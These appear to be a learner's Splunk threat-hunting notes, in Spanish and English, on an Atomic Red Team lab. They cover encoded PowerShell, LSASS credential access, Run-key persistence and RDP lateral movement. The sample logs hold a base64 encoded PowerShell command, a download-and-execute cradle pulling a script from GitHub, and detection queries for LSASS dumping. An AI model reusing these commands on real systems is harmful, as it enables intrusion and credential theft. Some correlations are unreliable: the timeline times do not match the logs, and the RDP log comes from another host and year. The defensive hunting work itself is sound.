# Investigation Queries

## Phase 1 — Initial Triage

index=main | stats count by sourcetype
Resultado: ~7000 eventos xmlwineventlog (Sysmon), 34 XmlWinEventLog:Security

index=main | stats count by Computer
Resultado: win-dc-397 (929 eventos), win-dc-942 (6031 eventos) — domain controllers

#peligoro que sea dc ya que es el servidor mas critico en una red windows si se compromete el atacante tiene control total del dominio. 


## Phase 2 — PowerShell Execution (T1059.001)

Query usada:
index=main Image="*\\powershell.exe" CommandLine IN ("*-enc*", "*-WindowStyle Hidden*", "*-ExecutionPolicy Bypass*", "*-NoProfile*")

Hallazgo: PowerShell con -EncodedCommand y -ExecutionPolicy Bypass.
Comando codificado en Base64 — payload ejecutado en memoria.

ejemplo log: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -NonInteractive -ExecutionPolicy Unrestricted -EncodedCommand JgBjAGgAYwBwAC4AYwBvAG0AIAA2ADUAMAAwADEAIAA+ACAAJABuAHUAbABsAAoAJABlAHgAZQBjAF8AdwByAGEAcABwAGUAcgBfAHMAdAByACAAPQAgACQAaQBuAHAAdQB0ACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcACgAkAHMAcABsAGkAdABfAHAAYQByAHQAcwAgAD0AIAAkAGUAeABlAGMAXwB3AHIAYQBwAHAAZQByAF8AcwB0AHIALgBTAHAAbABpAHQAKABAACgAIgBgADAAYAAwAGAAMABgADAAIgApACwAIAAyACwAIABbAFMAdAByAGkAbgBnAFMAcABsAGkAdABPAHAAdABpAG8AbgBzAF0AOgA6AFIAZQBtAG8AdgBlAEUAbQBwAHQAeQBFAG4AdAByAGkAZQBzACkACgBJAGYAIAAoAC0AbgBvAHQAIAAkAHMAcABsAGkAdABfAHAAYQByAHQAcwAuAEwAZQBuAGcAdABoACAALQBlAHEAIAAyACkAIAB7ACAAdABoAHIAbwB3ACAAIgBpAG4AdgBhAGwAaQBkACAAcABhAHkAbABvAGEAZAAiACAAfQAKAFMAZQB0AC0AVgBhAHIAaQBhAGIAbABlACAALQBOAGEAbQBlACAAagBzAG8AbgBfAHIAYQB3ACAALQBWAGEAbAB1AGUAIAAkAHMAcABsAGkAdABfAHAAYQByAHQAcwBbADEAXQAKACQAZQB4AGUAYwBfAHcAcgBhAHAAcABlAHIAIAA9ACAAWwBTAGMAcgBpAHAAdABCAGwAbwBjAGsAXQA6ADoAQwByAGUAYQB0AGUAKAAkAHMAcABsAGkAdABfAHAAYQByAHQAcwBbADAAXQApAAoAJgAkAGUAeABlAGMAXwB3AHIAYQBwAHAAZQByAA=="


## Phase 3 — Credential Dumping (T1003.001)

Query usada:
index=main TargetImage="*\\lsass.exe" GrantedAccess IN ("*0x1010*", "*0x1410*", "*0x1438*")

Resultado: 1 evento en win-dc-942

Hallazgo: powershell.exe accedió a lsass.exe con GrantedAccess=0x1410
(lectura de memoria). Dump de credenciales confirmado.


ejemplo log:"<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385F-C22A-43E0-BF4C-06F5698FFBD9}'/><EventID>10</EventID><Version>3</Version><Level>4</Level><Task>10</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2020-11-27T08:46:26.107985600Z'/><EventRecordID>1143</EventRecordID><Correlation/><Execution ProcessID='3124' ThreadID='3608'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>win-dc-942.attackrange.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2020-11-27 08:46:16.255</Data><Data Name='SourceProcessGUID'>{3368E97D-BCD1-5FC0-1800-000000009101}</Data><Data Name='SourceProcessId'>2136</Data><Data Name='SourceThreadId'>2796</Data><Data Name='SourceImage'>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data><Data Name='TargetProcessGUID'>{3368E97D-BCCE-5FC0-0B00-000000009101}</Data><Data Name='TargetProcessId'>868</Data><Data Name='TargetImage'>C:\Windows\system32\lsass.exe</Data><Data Name='GrantedAccess'>0x1410</Data><Data Name='CallTrace'>C:\Windows\SYSTEM32\ntdll.dll+a5a94|C:\Windows\System32\KERNELBASE.dll+221bd|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\7e90080f26800b0f94f23eecd5dbab97\System.ni.dll+3364bd|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\7e90080f26800b0f94f23eecd5dbab97\System.ni.dll+2b3a5c|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\7e90080f26800b0f94f23eecd5dbab97\System.ni.dll+2b294b|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\7e90080f26800b0f94f23eecd5dbab97\System.ni.dll+2b2884|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\7e90080f26800b0f94f23eecd5dbab97\System.ni.dll+2b335c|UNKNOWN(00007FFA8A463F41)</Data></EventData></Event>"



## Phase 4 — Persistence (T1547.001)

Anotá en Phase 4:

Query usada:
index=main EventType="SetValue" TargetObject IN ("*\\CurrentVersion\\Run*", "*\\CurrentVersion\\RunOnce*")

Resultado: 3 eventos en win-dc-942

Hallazgo: reg.exe escribió 3 claves de persistencia:
- AtomicRedTeam.exe en Run (ejecuta en cada login)
- AtomicRedTeam.dll en RunOnceEx
- PowerShell web cradle en RunOnce descargando desde raw.githubusercontent.com



ejemplo log: "<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385F-C22A-43E0-BF4C-06F5698FFBD9}'/><EventID>13</EventID><Version>2</Version><Level>4</Level><Task>13</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2020-11-27T08:47:42.590091100Z'/><EventRecordID>4477</EventRecordID><Correlation/><Execution ProcessID='3124' ThreadID='3608'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>win-dc-942.attackrange.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>T1060,RunKey</Data><Data Name='EventType'>SetValue</Data><Data Name='UtcTime'>2020-11-27 08:47:42.586</Data><Data Name='ProcessGuid'>{3368E97D-BD2E-5FC0-EC00-000000009101}</Data><Data Name='ProcessId'>4736</Data><Data Name='Image'>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data><Data Name='TargetObject'>HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce\NextRun</Data><Data Name='Details'>powershell.exe "IEX (New-Object Net.WebClient).DownloadString(`"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/ARTifacts/Misc/Discovery.bat`")"</Data></EventData></Event>"

## Phase 5 — Lateral Movement (T1021.001)
El atacante dumpeó las credenciales de Administrator de lsass en Fase 3, y ahora las está usando para conectarse por RDP desde 10.0.1.12 a otros sistemas. Eso es movimiento lateral — ya no está en un solo host, se está expandiendo por la red.

Anotá en Phase 5:

Query usada:
index=main source="WinEventLog:Security" EventCode=4624 LogonType=10

Resultado: 17 eventos

Hallazgo: Usuario Administrator conectándose por RDP desde 10.0.1.12.
Credenciales robadas en Fase 3 usadas para moverse lateralmente.


ejemplo de log: "<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Security-Auditing' Guid='{54849625-5478-4994-A5BA-3E3B0328C30D}'/><EventID>4624</EventID><Version>2</Version><Level>0</Level><Task>12544</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime='2025-07-17T08:36:48.072601100Z'/><EventRecordID>529720</EventRecordID><Correlation/><Execution ProcessID='588' ThreadID='636'/><Channel>Security</Channel><Computer>ar-win-dc.attackrange.local</Computer><Security/></System><EventData><Data Name='SubjectUserSid'>NT AUTHORITY\SYSTEM</Data><Data Name='SubjectUserName'>AR-WIN-DC$</Data><Data Name='SubjectDomainName'>ATTACKRANGE</Data><Data Name='SubjectLogonId'>0x3e7</Data><Data Name='TargetUserSid'>ATTACKRANGE\Administrator</Data><Data Name='TargetUserName'>Administrator</Data><Data Name='TargetDomainName'>ATTACKRANGE</Data><Data Name='TargetLogonId'>0x441c0</Data><Data Name='LogonType'>10</Data><Data Name='LogonProcessName'>User32 </Data><Data Name='AuthenticationPackageName'>Negotiate</Data><Data Name='WorkstationName'>AR-WIN-DC</Data><Data Name='LogonGuid'>{39590160-7D45-79EA-77CA-13F207A7AC86}</Data><Data Name='TransmittedServices'>-</Data><Data Name='LmPackageName'>-</Data><Data Name='KeyLength'>0</Data><Data Name='ProcessId'>0x3b4</Data><Data Name='ProcessName'>C:\Windows\System32\svchost.exe</Data><Data Name='IpAddress'>10.0.1.12</Data><Data Name='IpPort'>0</Data><Data Name='ImpersonationLevel'>%%1833</Data><Data Name='RestrictedAdminMode'>%%1843</Data><Data Name='TargetOutboundUserName'>-</Data><Data Name='TargetOutboundDomainName'>-</Data><Data Name='VirtualAccount'>%%1843</Data><Data Name='TargetLinkedLogonId'>0x0</Data><Data Name='ElevatedToken'>%%1842</Data></EventData></Event>"



## Phase 6 — Timeline Correlation

08:56:59 - PowerShell codificado + LSASS dump + Persistencia en registry
           (simultáneos, mismo script en win-dc-942)
09:15:24 - RDP lateral movement con credenciales robadas desde 10.0.1.12
           (17 minutos después)

